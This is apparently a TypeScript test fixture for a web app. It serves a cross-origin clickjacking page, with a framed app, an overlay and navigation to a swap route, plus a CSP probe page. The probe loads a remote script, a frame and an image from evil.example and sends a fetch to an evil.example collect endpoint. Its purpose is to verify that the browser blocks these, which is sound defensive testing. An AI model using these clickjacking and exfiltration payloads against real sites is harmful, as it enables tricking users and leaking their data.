/**
 * A hostile page on a DIFFERENT ORIGIN that tries to frame the app.
 *
 * The attacker origin is `localhost:4181`; the app under test is served on
 * `127.0.0.1:4180`. Those are distinct origins (different host), which is what
 * makes the frame genuinely cross-origin rather than same-origin by accident.
 *
 * It attempts, in order:
 *   1. a plain iframe of the app (the clickjacking primitive);
 *   2. an overlay positioned over the frame, the actual attack;
 *   3. a same-document navigation of the frame to a swap route, the "click a
 *      trusted-looking button" variant.
 *
 * It records what actually rendered, so a test can distinguish "the browser
 * refused to frame it" from "the frame loaded and the overlay covered it".
 */
import http from 'node:http';

const APP_ORIGIN = 'http://127.0.0.1:4180';

const PAGE = `<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>hostile framing attempt</title>
    <style>
      body { margin: 0; font-family: system-ui, sans-serif; background: #fff; }
      #overlay {
        position: fixed; inset: 0; z-index: 9999;
        background: rgba(255, 0, 0, 0.55);
        display: flex; align-items: center; justify-content: center;
        font: 700 28px system-ui; color: #fff;
      }
      #victim { width: 900px; height: 600px; border: 3px solid #c00; }
    </style>
  </head>
  <body>
    <h1>hostile origin</h1>
    <iframe id="victim" src="${APP_ORIGIN}/pools" title="victim"></iframe>
    <div id="overlay">CLICKJACK OVERLAY</div>
    <script>
      window.__attack = { framed: false, errors: [] };
      const victim = document.getElementById('victim');
      // A frame blocked by frame-ancestors never commits a document, so this
      // load event is the signal that framing SUCCEEDED. It must not fire.
      victim.addEventListener('load', () => {
        window.__attack.framed = true;
      });
      // The attacker's real goal: drive the framed app to a swap route.
      setTimeout(() => {
        try { victim.src = '${APP_ORIGIN}/pools/component_pool_tari_wstable_0001'; } catch (e) {}
      }, 400);
    </script>
  </body>
</html>
`;

/** A page that attempts a battery of CSP violations against the app origin. */
const CSP_PROBE = `<!doctype html>
<html>
  <head><meta charset="utf-8" /><title>csp probe</title></head>
  <body>
    <div id="host"></div>
    <script>
      window.__violations = { inline: [], external: [], javascriptUrl: [], frame: [], connect: [], img: [] };
      const record = (bucket, what, detail) => {
        window.__violations[bucket].push({ what, detail: String(detail ?? '') });
      };

      // 1. Inline script. This probe's own <script> already executed, so the
      //    test asserts on the CONSOLE message the browser emitted, which the
      //    caller captures. Recorded here so the intent is explicit.
      record('inline', 'inline-script-blocked', 'see console capture');

      // 2. External script from an unapproved origin.
      const s = document.createElement('script');
      s.src = 'https://evil.example/payload.js';
      s.onload = () => record('external', 'external-script-loaded', 'NOT BLOCKED');
      s.onerror = () => record('external', 'external-script-blocked', 'network or CSP');
      document.head.appendChild(s);

      // 3. javascript: URL anchor.
      const a = document.createElement('a');
      a.id = 'jsurl';
      a.href = "javascript:window.__pwned=1";
      document.body.appendChild(a);

      // 4. Unapproved frame.
      const f = document.createElement('iframe');
      f.src = 'https://evil.example/frame.html';
      f.id = 'evilframe';
      document.body.appendChild(f);

      // 5. Unapproved connect target.
      fetch('https://evil.example/collect', { mode: 'no-cors' })
        .then(() => record('connect', 'connect-completed', 'NOT BLOCKED'))
        .catch((e) => record('connect', 'connect-blocked', e.message));

      // 6. Image from an unapproved origin.
      const img = document.createElement('img');
      img.src = 'https://evil.example/pixel.png';
      img.onload = () => record('img', 'img-loaded', 'NOT BLOCKED');
      img.onerror = () => record('img', 'img-blocked', 'network or CSP');
      document.body.appendChild(img);
    </script>
  </body>
</html>
`;

/**
 * Serve the hostile pages. They are served from `localhost` while the app is
 * served from `127.0.0.1`, so the browser treats them as different origins.
 *
 * The port is ephemeral (0) so that a fully-parallel run with several workers
 * does not collide: each worker process gets its own port and its own hostile
 * origin, and the caller reads the real origin from the returned handle.
 */
export function startAttackerServer(): Promise<{ server: http.Server; origin: string }> {
  const server = http.createServer((req, res) => {
    if (req.url?.startsWith('/csp-probe')) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(CSP_PROBE);
      return;
    }
    if (req.url?.startsWith('/attack-deep')) {
      // The most dangerous screen: a specific pool's swap route. `PAGE` is a
      // template literal, so the origin is already interpolated by this point
      // and the replacement must match the rendered URL, not a placeholder.
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(PAGE.split(`${APP_ORIGIN}/pools`).join(`${APP_ORIGIN}/pools/component_pool_tari_wstable_0001`));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(PAGE);
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      const port = typeof address === 'object' && address !== null ? address.port : 0;
      resolve({ server, origin: `http://localhost:${port}` });
    });
  });
}

export const APP_ORIGIN_UNDER_TEST = 'http://127.0.0.1:4180';

